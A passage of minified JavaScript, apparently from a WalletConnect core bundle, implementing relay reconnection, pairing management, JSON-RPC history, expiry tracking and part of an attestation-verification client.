this.provider.connection.send(r)}unregisterProviderListeners(){this.provider.off(Mn.payload,this.onPayloadHandler),this.provider.off(Mn.connect,this.onConnectHandler),this.provider.off(Mn.disconnect,this.onDisconnectHandler),this.provider.off(Mn.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await rv();Q8(async r=>{e!==r&&(e=r,r?await this.transportOpen().catch(n=>this.logger.error(n,n==null?void 0:n.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))})}async onProviderDisconnect(){clearTimeout(this.pingTimeout),this.events.emit(vr.disconnect),this.connectionAttemptInProgress=!1,!this.reconnectInProgress&&(this.reconnectInProgress=!0,await this.subscriber.stop(),this.subscriber.hasAnyTopics&&(this.transportExplicitlyClosed||(this.reconnectTimeout=setTimeout(async()=>{await this.transportOpen().catch(e=>this.logger.error(e,e==null?void 0:e.message)),this.reconnectTimeout=void 0,this.reconnectInProgress=!1},se.toMiliseconds(t4)))))}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){await this.confirmOnlineStateOrThrow(),!this.connected&&await this.connect()}}function CU(){}function Iv(t){if(!t||typeof t!="object")return!1;const e=Object.getPrototypeOf(t);return e===null||e===Object.prototype||Object.getPrototypeOf(e)===null?Object.prototype.toString.call(t)==="[object Object]":!1}function xv(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function Sv(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const IU="[object RegExp]",xU="[object String]",SU="[object Number]",NU="[object Boolean]",Nv="[object Arguments]",TU="[object Symbol]",PU="[object Date]",RU="[object Map]",OU="[object Set]",kU="[object Array]",DU="[object Function]",MU="[object ArrayBuffer]",ug="[object Object]",BU="[object Error]",UU="[object DataView]",$U="[object Uint8Array]",LU="[object Uint8ClampedArray]",FU="[object Uint16Array]",jU="[object Uint32Array]",qU="[object BigUint64Array]",zU="[object Int8Array]",HU="[object Int16Array]",WU="[object Int32Array]",GU="[object BigInt64Array]",VU="[object Float32Array]",KU="[object Float64Array]";function QU(t,e){return t===e||Number.isNaN(t)&&Number.isNaN(e)}function YU(t,e,r){return _u(t,e,void 0,void 0,void 0,void 0,r)}function _u(t,e,r,n,i,s,o){const a=o(t,e,r,n,i,s);if(a!==void 0)return a;if(typeof t==typeof e)switch(typeof t){case"bigint":case"string":case"boolean":case"symbol":case"undefined":return t===e;case"number":return t===e||Object.is(t,e);case"function":return t===e;case"object":return Pu(t,e,s,o)}return Pu(t,e,s,o)}function Pu(t,e,r,n){if(Object.is(t,e))return!0;let i=Sv(t),s=Sv(e);if(i===Nv&&(i=ug),s===Nv&&(s=ug),i!==s)return!1;switch(i){case xU:return t.toString()===e.toString();case SU:{const c=t.valueOf(),u=e.valueOf();return QU(c,u)}case NU:case PU:case TU:return Object.is(t.valueOf(),e.valueOf());case IU:return t.source===e.source&&t.flags===e.flags;case DU:return t===e}r=r??new Map;const o=r.get(t),a=r.get(e);if(o!=null&&a!=null)return o===e;r.set(t,e),r.set(e,t);try{switch(i){case RU:{if(t.size!==e.size)return!1;for(const[c,u]of t.entries())if(!e.has(c)||!_u(u,e.get(c),c,t,e,r,n))return!1;return!0}case OU:{if(t.size!==e.size)return!1;const c=Array.from(t.values()),u=Array.from(e.values());for(let l=0;l<c.length;l++){const h=c[l],d=u.findIndex(g=>_u(h,g,void 0,t,e,r,n));if(d===-1)return!1;u.splice(d,1)}return!0}case kU:case $U:case LU:case FU:case jU:case qU:case zU:case HU:case WU:case GU:case VU:case KU:{if(typeof Buffer<"u"&&Buffer.isBuffer(t)!==Buffer.isBuffer(e)||t.length!==e.length)return!1;for(let c=0;c<t.length;c++)if(!_u(t[c],e[c],c,t,e,r,n))return!1;return!0}case MU:return t.byteLength!==e.byteLength?!1:Pu(new Uint8Array(t),new Uint8Array(e),r,n);case UU:return t.byteLength!==e.byteLength||t.byteOffset!==e.byteOffset?!1:Pu(new Uint8Array(t),new Uint8Array(e),r,n);case BU:return t.name===e.name&&t.message===e.message;case ug:{if(!(Pu(t.constructor,e.constructor,r,n)||Iv(t)&&Iv(e)))return!1;const c=[...Object.keys(t),...xv(t)],u=[...Object.keys(e),...xv(e)];if(c.length!==u.length)return!1;for(let l=0;l<c.length;l++){const h=c[l],d=t[h];if(!Object.hasOwn(e,h))return!1;const g=e[h];if(!_u(d,g,h,t,e,r,n))return!1}return!0}default:return!1}}finally{r.delete(t),r.delete(e)}}function JU(t,e){return YU(t,e,CU)}var ZU=Object.defineProperty,Tv=Object.getOwnPropertySymbols,XU=Object.prototype.hasOwnProperty,e$=Object.prototype.propertyIsEnumerable,Zm=(t,e,r)=>e in t?ZU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Pv=(t,e)=>{for(var r in e||(e={}))XU.call(e,r)&&Zm(t,r,e[r]);if(Tv)for(var r of Tv(e))e$.call(e,r)&&Zm(t,r,e[r]);return t},nn=(t,e,r)=>Zm(t,typeof e!="symbol"?e+"":e,r);class Ea extends xT{constructor(e,r,n,i=Li,s=void 0){super(e,r,n,i),this.core=e,this.logger=r,this.name=n,nn(this,"map",new Map),nn(this,"version",r4),nn(this,"cached",[]),nn(this,"initialized",!1),nn(this,"getKey"),nn(this,"storagePrefix",Li),nn(this,"recentlyDeleted",[]),nn(this,"recentlyDeletedLimit",200),nn(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!Or(o)?this.map.set(this.getKey(o),o):x8(o)?this.map.set(o.id,o):S8(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)}),nn(this,"set",async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())}),nn(this,"get",o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o))),nn(this,"getAll",o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>JU(a[c],o[c]))):this.values)),nn(this,"update",async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=Pv(Pv({},this.getData(o)),a);this.map.set(o,c),await this.persist()}),nn(this,"delete",async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())}),this.logger=Gr(r,this.name),this.storagePrefix=i,this.getKey=s}get context(){return gn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const r=this.map.get(e);if(!r){if(this.recentlyDeleted.includes(e)){const{message:i}=oe("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}const{message:n}=oe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(n),new Error(n)}return r}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:r}=oe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var t$=Object.defineProperty,r$=(t,e,r)=>e in t?t$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Le=(t,e,r)=>r$(t,typeof e!="symbol"?e+"":e,r);class n${constructor(e,r){this.core=e,this.logger=r,Le(this,"name",o4),Le(this,"version",a4),Le(this,"events",new H0),Le(this,"pairings"),Le(this,"initialized",!1),Le(this,"storagePrefix",Li),Le(this,"ignoredPayloadTypes",[ps]),Le(this,"registeredMethods",[]),Le(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),Le(this,"register",({methods:n})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...n])]}),Le(this,"create",async n=>{this.isInitialized();const i=Fm(),s=await this.core.crypto.setSymKey(i),o=lr(se.FIVE_MINUTES),a={protocol:$C},c={topic:s,expiry:o,relay:a,active:!1,methods:n==null?void 0:n.methods},u=Yb({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:i,relay:a,expiryTimestamp:o,methods:n==null?void 0:n.methods});return this.events.emit(Do.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:n==null?void 0:n.transportType}),{topic:s,uri:u}}),Le(this,"pair",async n=>{this.isInitialized();const i=this.core.eventClient.createEvent({properties:{topic:n==null?void 0:n.uri,trace:[xi.pairing_started]}});this.isValidPair(n,i);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:u}=Qb(n.uri);i.props.properties.topic=s,i.addTrace(xi.pairing_uri_validation_success),i.addTrace(xi.pairing_uri_not_expired);let l;if(this.pairings.keys.includes(s)){if(l=this.pairings.get(s),i.addTrace(xi.existing_pairing),l.active)throw i.setError(ss.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);i.addTrace(xi.pairing_not_expired)}const h=c||lr(se.FIVE_MINUTES),d={topic:s,relay:a,expiry:h,active:!1,methods:u};this.core.expirer.set(s,h),await this.pairings.set(s,d),i.addTrace(xi.store_new_pairing),n.activatePairing&&await this.activate({topic:s}),this.events.emit(Do.create,d),i.addTrace(xi.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),i.addTrace(xi.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{i.setError(ss.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(g){throw i.setError(ss.subscribe_pairing_topic_failure),g}return i.addTrace(xi.subscribe_pairing_topic_success),d}),Le(this,"activate",async({topic:n})=>{this.isInitialized();const i=lr(se.FIVE_MINUTES);this.core.expirer.set(n,i),await this.pairings.update(n,{active:!0,expiry:i})}),Le(this,"ping",async n=>{this.isInitialized(),await this.isValidPing(n),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:i}=n;if(this.pairings.keys.includes(i)){const s=await this.sendRequest(i,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=To();this.events.once(it("pairing_ping",s),({error:u})=>{u?c(u):a()}),await o()}}),Le(this,"updateExpiry",async({topic:n,expiry:i})=>{this.isInitialized(),await this.pairings.update(n,{expiry:i})}),Le(this,"updateMetadata",async({topic:n,metadata:i})=>{this.isInitialized(),await this.pairings.update(n,{peerMetadata:i})}),Le(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),Le(this,"disconnect",async n=>{this.isInitialized(),await this.isValidDisconnect(n);const{topic:i}=n;this.pairings.keys.includes(i)&&(await this.sendRequest(i,"wc_pairingDelete",ht("USER_DISCONNECTED")),await this.deletePairing(i))}),Le(this,"formatUriFromPairing",n=>{this.isInitialized();const{topic:i,relay:s,expiry:o,methods:a}=n,c=this.core.crypto.keychain.get(i);return Yb({protocol:this.core.protocol,version:this.core.version,topic:i,symKey:c,relay:s,expiryTimestamp:o,methods:a})}),Le(this,"sendRequest",async(n,i,s)=>{const o=Ks(i,s),a=await this.core.crypto.encode(n,o),c=ou[i].req;return this.core.history.set(n,o),this.core.relayer.publish(n,a,c),o.id}),Le(this,"sendResult",async(n,i,s)=>{const o=kf(n,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,n)).request.method,u=ou[c].res;await this.core.relayer.publish(i,a,u),await this.core.history.resolve(o)}),Le(this,"sendError",async(n,i,s)=>{const o=Df(n,s),a=await this.core.crypto.encode(i,o),c=(await this.core.history.get(i,n)).request.method,u=ou[c]?ou[c].res:ou.unregistered_method.res;await this.core.relayer.publish(i,a,u),await this.core.history.resolve(o)}),Le(this,"deletePairing",async(n,i)=>{await this.core.relayer.unsubscribe(n),await Promise.all([this.pairings.delete(n,ht("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(n),i?Promise.resolve():this.core.expirer.del(n)])}),Le(this,"cleanup",async()=>{const n=this.pairings.getAll().filter(i=>Fs(i.expiry));await Promise.all(n.map(i=>this.deletePairing(i.topic)))}),Le(this,"onRelayEventRequest",async n=>{const{topic:i,payload:s}=n;switch(s.method){case"wc_pairingPing":return await this.onPairingPingRequest(i,s);case"wc_pairingDelete":return await this.onPairingDeleteRequest(i,s);default:return await this.onUnknownRpcMethodRequest(i,s)}}),Le(this,"onRelayEventResponse",async n=>{const{topic:i,payload:s}=n,o=(await this.core.history.get(i,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(i,s);default:return this.onUnknownRpcMethodResponse(o)}}),Le(this,"onPairingPingRequest",async(n,i)=>{const{id:s}=i;try{this.isValidPing({topic:n}),await this.sendResult(s,n,!0),this.events.emit(Do.ping,{id:s,topic:n})}catch(o){await this.sendError(s,n,o),this.logger.error(o)}}),Le(this,"onPairingPingResponse",(n,i)=>{const{id:s}=i;setTimeout(()=>{Ti(i)?this.events.emit(it("pairing_ping",s),{}):zn(i)&&this.events.emit(it("pairing_ping",s),{error:i.error})},500)}),Le(this,"onPairingDeleteRequest",async(n,i)=>{const{id:s}=i;try{this.isValidDisconnect({topic:n}),await this.deletePairing(n),this.events.emit(Do.delete,{id:s,topic:n})}catch(o){await this.sendError(s,n,o),this.logger.error(o)}}),Le(this,"onUnknownRpcMethodRequest",async(n,i)=>{const{id:s,method:o}=i;try{if(this.registeredMethods.includes(o))return;const a=ht("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,n,a),this.logger.error(a)}catch(a){await this.sendError(s,n,a),this.logger.error(a)}}),Le(this,"onUnknownRpcMethodResponse",n=>{this.registeredMethods.includes(n)||this.logger.error(ht("WC_METHOD_UNSUPPORTED",n))}),Le(this,"isValidPair",(n,i)=>{var s;if(!un(n)){const{message:a}=oe("MISSING_OR_INVALID",`pair() params: ${n}`);throw i.setError(ss.malformed_pairing_uri),new Error(a)}if(!I8(n.uri)){const{message:a}=oe("MISSING_OR_INVALID",`pair() uri: ${n.uri}`);throw i.setError(ss.malformed_pairing_uri),new Error(a)}const o=Qb(n==null?void 0:n.uri);if(!((s=o==null?void 0:o.relay)!=null&&s.protocol)){const{message:a}=oe("MISSING_OR_INVALID","pair() uri#relay-protocol");throw i.setError(ss.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=oe("MISSING_OR_INVALID","pair() uri#symKey");throw i.setError(ss.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&se.toMiliseconds(o==null?void 0:o.expiryTimestamp)<Date.now()){i.setError(ss.pairing_expired);const{message:a}=oe("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}}),Le(this,"isValidPing",async n=>{if(!un(n)){const{message:s}=oe("MISSING_OR_INVALID",`ping() params: ${n}`);throw new Error(s)}const{topic:i}=n;await this.isValidPairingTopic(i)}),Le(this,"isValidDisconnect",async n=>{if(!un(n)){const{message:s}=oe("MISSING_OR_INVALID",`disconnect() params: ${n}`);throw new Error(s)}const{topic:i}=n;await this.isValidPairingTopic(i)}),Le(this,"isValidPairingTopic",async n=>{if(!ar(n,!1)){const{message:i}=oe("MISSING_OR_INVALID",`pairing topic should be a string: ${n}`);throw new Error(i)}if(!this.pairings.keys.includes(n)){const{message:i}=oe("NO_MATCHING_KEY",`pairing topic doesn't exist: ${n}`);throw new Error(i)}if(Fs(this.pairings.get(n).expiry)){await this.deletePairing(n);const{message:i}=oe("EXPIRED",`pairing topic: ${n}`);throw new Error(i)}}),this.core=e,this.logger=Gr(r,this.name),this.pairings=new Ea(this.core,this.logger,this.name,this.storagePrefix)}get context(){return gn(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(vr.message,async e=>{const{topic:r,message:n,transportType:i}=e;if(this.pairings.keys.includes(r)&&i!==Wt.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(n)))try{const s=await this.core.crypto.decode(r,n);ly(s)?(this.core.history.set(r,s),await this.onRelayEventRequest({topic:r,payload:s})):Mf(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:r,payload:s}),this.core.history.delete(r,s.id)),await this.core.relayer.messages.ack(r,n)}catch(s){this.logger.error(s)}})}registerExpirerEvents(){this.core.expirer.on(qn.expired,async e=>{const{topic:r}=K_(e.target);r&&this.pairings.keys.includes(r)&&(await this.deletePairing(r,!0),this.events.emit(Do.expire,{topic:r}))})}}var i$=Object.defineProperty,s$=(t,e,r)=>e in t?i$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Tr=(t,e,r)=>s$(t,typeof e!="symbol"?e+"":e,r);class o$ extends AT{constructor(e,r){super(e,r),this.core=e,this.logger=r,Tr(this,"records",new Map),Tr(this,"events",new Vn.EventEmitter),Tr(this,"name",c4),Tr(this,"version",u4),Tr(this,"cached",[]),Tr(this,"initialized",!1),Tr(this,"storagePrefix",Li),Tr(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(n=>this.records.set(n.id,n)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),Tr(this,"set",(n,i,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:n,request:i,chainId:s}),this.records.has(i.id))return;const o={id:i.id,topic:n,request:{method:i.method,params:i.params||null},chainId:s,expiry:lr(se.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(ei.created,o)}),Tr(this,"resolve",async n=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:n}),!this.records.has(n.id))return;const i=await this.getRecord(n.id);typeof i.response>"u"&&(i.response=zn(n)?{error:n.error}:{result:n.result},this.records.set(i.id,i),this.persist(),this.events.emit(ei.updated,i))}),Tr(this,"get",async(n,i)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:n,id:i}),await this.getRecord(i))),Tr(this,"delete",(n,i)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:i}),this.values.forEach(s=>{if(s.topic===n){if(typeof i<"u"&&s.id!==i)return;this.records.delete(s.id),this.events.emit(ei.deleted,s)}}),this.persist()}),Tr(this,"exists",async(n,i)=>(this.isInitialized(),this.records.has(i)?(await this.getRecord(i)).topic===n:!1)),Tr(this,"on",(n,i)=>{this.events.on(n,i)}),Tr(this,"once",(n,i)=>{this.events.once(n,i)}),Tr(this,"off",(n,i)=>{this.events.off(n,i)}),Tr(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),this.logger=Gr(r,this.name)}get context(){return gn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(r=>{if(typeof r.response<"u")return;const n={topic:r.topic,request:Ks(r.request.method,r.request.params,r.id),chainId:r.chainId};return e.push(n)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const r=this.records.get(e);if(!r){const{message:n}=oe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(n)}return r}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(ei.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:r}=oe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(ei.created,e=>{const r=ei.created;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,record:e})}),this.events.on(ei.updated,e=>{const r=ei.updated;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,record:e})}),this.events.on(ei.deleted,e=>{const r=ei.deleted;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,record:e})}),this.core.heartbeat.on(kc.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(r=>{se.toMiliseconds(r.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${r.id}`),this.records.delete(r.id),this.events.emit(ei.deleted,r,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var a$=Object.defineProperty,c$=(t,e,r)=>e in t?a$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Fr=(t,e,r)=>c$(t,typeof e!="symbol"?e+"":e,r);class u$ extends NT{constructor(e,r){super(e,r),this.core=e,this.logger=r,Fr(this,"expirations",new Map),Fr(this,"events",new Vn.EventEmitter),Fr(this,"name",l4),Fr(this,"version",h4),Fr(this,"cached",[]),Fr(this,"initialized",!1),Fr(this,"storagePrefix",Li),Fr(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(n=>this.expirations.set(n.target,n)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),Fr(this,"has",n=>{try{const i=this.formatTarget(n);return typeof this.getExpiration(i)<"u"}catch{return!1}}),Fr(this,"set",(n,i)=>{this.isInitialized();const s=this.formatTarget(n),o={target:s,expiry:i};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(qn.created,{target:s,expiration:o})}),Fr(this,"get",n=>{this.isInitialized();const i=this.formatTarget(n);return this.getExpiration(i)}),Fr(this,"del",n=>{if(this.isInitialized(),this.has(n)){const i=this.formatTarget(n),s=this.getExpiration(i);this.expirations.delete(i),this.events.emit(qn.deleted,{target:i,expiration:s})}}),Fr(this,"on",(n,i)=>{this.events.on(n,i)}),Fr(this,"once",(n,i)=>{this.events.once(n,i)}),Fr(this,"off",(n,i)=>{this.events.off(n,i)}),Fr(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),this.logger=Gr(r,this.name)}get context(){return gn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return BD(e);if(typeof e=="number")return UD(e);const{message:r}=oe("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(r)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(qn.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:r}=oe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const r=this.expirations.get(e);if(!r){const{message:n}=oe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(n),new Error(n)}return r}checkExpiry(e,r){const{expiry:n}=r;se.toMiliseconds(n)-Date.now()<=0&&this.expire(e,r)}expire(e,r){this.expirations.delete(e),this.events.emit(qn.expired,{target:e,expiration:r})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,r)=>this.checkExpiry(r,e))}registerEventListeners(){this.core.heartbeat.on(kc.pulse,()=>this.checkExpirations()),this.events.on(qn.created,e=>{const r=qn.created;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,data:e}),this.persist()}),this.events.on(qn.expired,e=>{const r=qn.expired;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,data:e}),this.persist()}),this.events.on(qn.deleted,e=>{const r=qn.deleted;this.logger.info(`Emitting ${r}`),this.logger.debug({type:"event",event:r,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var l$=Object.defineProperty,h$=(t,e,r)=>e in t?l$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ir=(t,e,r)=>h$(t,typeof e!="symbol"?e+"":e,r);class d$ extends TT{constructor(e,r,n){super(e,r,n),this.core=e,this.logger=r,this.store=n,ir(this,"name",d4),ir(this,"abortController"),ir(this,"isDevEnv"),ir(this,"verifyUrlV3",p4),ir(this,"storagePrefix",Li),ir(this,"version",UC),ir(this,"publicKey"),ir(this,"fetchPromise"),ir(this,"init",async()=>{var i;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&se.toMiliseconds((i=this.publicKey)==null?void 0:i.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),ir(this,"register",async i=>{if(!Jl()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=i,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const u=Xo.getDocument(),l=this.startAbortTimer(se.ONE_SECOND*5),h=await new Promise((d,g)=>{const y=()=>{window.removeEventListener("message",b),u.body.removeChild(m),g("attestation aborted")};this.abortController.signal.addEventListener("abort",y);const m=u.createElement("iframe");m.src=c,m.style.display="none",m.addEventListener("error",y,{signal:this.abortController.signal});const b=A=>{if(A.data&&typeof A.data=="string")try{const _=JSON.parse(A.data);if(_.type==="verify_attestation"){if(Am(_.attestation).payload.id!==o)return;clearInterval(l),u.body.removeChild(m),this.abortController.signal.removeEventListener("abort",y),window.removeEventListener("message",b),d(_.attestation===null?"":_.attestation)}}catch(_){this.logger.warn(_)}};u.body.appendChild(m),window.addEventListener("message",b,{signal:this.abortController.signal})});return this.logger.debug("jwt attestation",h),h}catch(u){this.logger.warn(u)}return""}),ir(this,"resolve",async i=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=i;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(Am(s).payload.id!==a)return;const u=await this.isValidJwtAttestation(s);if(u){if(!u.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return u}}if(!o)return;const c=this.getVerifyUrl(i==null?void 0:i.verifyUrl);return this.fetchAttestation(o,c)}),ir(this,"fetchAttestation",async(i,s)=>{this.logger.debug(`resolving attestation: ${i} from url: ${s}`);const o=this.startAbortTimer(se.ONE_SECOND*5),a=await fetch(`${s}/attestation/${i}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0}),ir(this,"getVerifyUrl",i=>{let s=i||Tu;return g4.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${Tu}`),s=Tu),s}),ir(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const i=this.startAbortTimer(se.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(i),await s.json()}catch(i){this.logger.warn(i)}}),ir(this,"persistPublicKey",async i=>{this.logger.debug("persisting public key to local storage",i),await this.store.setItem(this.storeKey,i),this.publicKey=i}),ir(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),ir(this,"isValidJwtAttestation",async i=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(i,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(i,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}}),ir(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),ir(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const i=await this.fetchPromise;return this.fetchPromise=void 0,i}),ir(this,"validateAttestation",(i,s)=>{const o=d8(i,s.publicKey),a={hasExpired:se.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}}),this.logger=Gr(r,this.name),this.abortController=new 